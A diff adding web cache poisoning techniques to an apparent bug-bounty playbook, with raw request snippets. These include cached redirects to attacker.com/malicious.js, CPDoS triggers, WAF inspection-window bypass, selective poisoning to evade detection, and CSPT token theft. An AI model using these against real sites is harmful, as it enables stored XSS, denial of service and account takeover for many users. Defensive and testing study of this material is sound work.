@@ -162,3 +162,73 @@ Detection: seed with a cache buster + the malformed request → observe `400`/`4
 curl -sI -H "Pragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-get-cache-key, akamai-x-check-cacheable" https://target/path
 # Cloudflare/Fastly: inspect CF-Cache-Status / X-Served-By / X-Cache + Age
 ```
+
+
+## Additional Techniques — ported from WebSkills (writeup-techniques/cache)
+
+### X-Forwarded-Scheme / X-Forwarded-Proto → cached redirect-loop DoS
+Rack/Rails trust `X-Forwarded-Scheme` to decide HTTPS enforcement. Spoof it against a static asset so the origin emits a cacheable `301`; every user then gets a redirect/loop instead of the asset. Combine scheme-spoof + host-spoof for irreversible redirects on high-visibility resources.
+```
+GET /assets/application.js HTTP/1.1
+Host: victim.com
+X-Forwarded-Scheme: http
+```
+
+### CORS ACAO reflection → cached DoS
+A reflected `Origin` cached as `Access-Control-Allow-Origin` means every visitor gets the wrong ACAO for that URL → browsers block the response = DoS (Automattic WP-JSON, 405 upvotes). Test by poisoning with `?cb=` and confirming the mismatched ACAO is served to a clean request.
+
+### Open Graph / canonical meta poisoning
+Reflected HTML injected inside `<meta property="og:...">` / `<link rel=canonical>` tags gets cached, then **social scrapers** consume the poisoned OG tags — spreading the payload far beyond direct visitors (Red Hat). Frames as stored XSS + phishing amplification. Use a harmless cache-buster while testing.
+
+### Route / hidden-route poisoning (third-party page platforms)
+On page-serving platforms (HubSpot, Ghost custom domains) you register a page, plant a payload, and trick the platform into serving your response on the victim's domain via the shared cache. Ghost: custom domains redirect from `user.ghost.io` — poison the mapping.
+
+### Memcache command injection (CRLF into a key-value store)
+When a platform passes unsanitized HTTP input into memcache's clear-text protocol, inject CRLF to add memcache commands and poison cached `user→server` mappings (e.g. the cache stores a user's IP/port + creds; rewrite them to your own server). Lets you desync responses even to users whose email you don't know. See CRLF-injection playbook.
+
+### CSPT-assisted cache deception (traversal → cached token → ATO)
+A SPA concatenates a route param into an API path and attaches auth headers. Inject client-side path traversal so the authenticated fetch lands on a cacheable static-suffix variant; the CDN caches the JSON token under a public key; read it back anonymously → ATO.
+```
+../../../v1/token.css
+```
+Recipe: find SPA URL builders that reuse auth headers → test `.css/.js/.jpg/.json` suffixes for `Cache-Control: public` + `X-Cache: Hit` on JSON → lure victim → read back logged-out.
+
+### Chaining unkeyed inputs + selective poisoning
+Seed the payload via one unkeyed input (param A) and trigger it via a second (param B) — neither alone changes the cached response ("Chaining Unkeyed Inputs"). **Selective poisoning**: gate the payload so the cache only stores it when a target condition matches (specific `User-Agent`, `Accept-Language`, or cookie), narrowing blast radius to chosen victims and evading detection.
+
+### Django ALLOWED_HOSTS bypass via custom middleware
+Even with `ALLOWED_HOSTS` set, apps that read `request.META['HTTP_HOST']` or `X-Forwarded-Host` in **custom middleware** reintroduce Host poisoning — a fake Host flows into poisoned password-reset/verification email links, CSRF, and cache poisoning.
+
+### CPDoS triggers beyond HHO/HMC/HMO
+Additional origin-error triggers whose cached response is served to all anon users of a key:
+```
+Host: victim.com:1                     # unkeyed dead port → redirect error, cached
+X-Amz-Website-Location-Redirect: someThing   # forces origin 4xx
+Host: viCTim.com                       # origin errors on non-lowercase Host; cache key normalized → cached error
+GET /%2e%2e%2fpath                     # origin errors on encoded path, cache stores under decoded key
+<unkeyed param that makes redirect URL huge>  # long-redirect error, cached
+```
+Detection caveat: some status codes aren't cached — retest, results can be flaky.
+
+### Shared static JS across subdomains → cached 301 to attacker JS
+When a single JS asset is served across dozens of subdomains and `X-Forwarded-Host` drives its redirect logic, an unkeyed cached `301 Location: https://attacker.com/malicious.js` becomes stored XSS **everywhere that asset is imported**. Map every host reusing the asset path to prove multi-subdomain blast radius (Shopify cross-host loops, PayPal).
+```
+GET /shared/asset.js HTTP/1.1
+Host: victim.com
+X-Forwarded-Host: attacker.com/malicious.js
+```
+
+### WAF inspection-window bypass (pad past inspected bytes)
+Akamai's WAF inspects only the first **8KB** by default (up to 128KB with Advanced Metadata); Cloudflare inspects up to **128KB**. Pad the request with junk so the XSS/CPDoS payload lands **past** the inspected window while still reaching the origin/cache. Static `.js` GETs may skip content inspection entirely — send the payload in an untrusted header on the `.js` GET, then race the HTML request.
+
+### Hop-by-hop header trick (drop a header before the cache-key stage)
+If a header is stripped by the cache but honored by the origin, list it in `Connection:` so a sloppy proxy drops it before the cache-key computation — the origin still processes the value while the cache never keys on it.
+```
+Connection: close, X-Forwarded-Host
+X-Forwarded-Host: attacker.com
+```
+
+### Escalation CVE chains (cache-poison as a link)
+- **Sitecore XP** pre-auth `HtmlCache` poisoning → post-auth BinaryFormatter deserialization RCE (CVE-2025-53691).
+- **Apache** `RewriteRule [P]` request-splitting → cache poisoning of arbitrary URLs (CVE-2023-25690).
+- Request smuggling / HTTP response desync → poison arbitrary URLs with an attacker-controlled (XSS) body, no unkeyed input needed.
